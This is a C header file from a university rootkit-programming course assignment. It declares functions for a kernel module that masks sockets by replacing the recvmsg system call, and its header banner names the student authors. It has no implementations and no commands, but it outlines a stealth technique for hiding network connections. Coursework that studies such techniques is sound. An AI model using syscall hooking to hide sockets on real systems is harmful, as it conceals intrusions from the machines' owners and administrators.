
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: socket_masking.h                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage: Header file for module `socket_masking.c`                          */
/*                                                                             */
/*******************************************************************************/

#ifndef __SOCKET_MASKING__
#define __SOCKET_MASKING__


/* Declaration of functions */
static int socket_masking_init(int);
static int socket_masking_exit(void);

asmlinkage ssize_t my_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);

static int mask_socket(char *, int);
static int unmask_socket(char *, int);

#endif
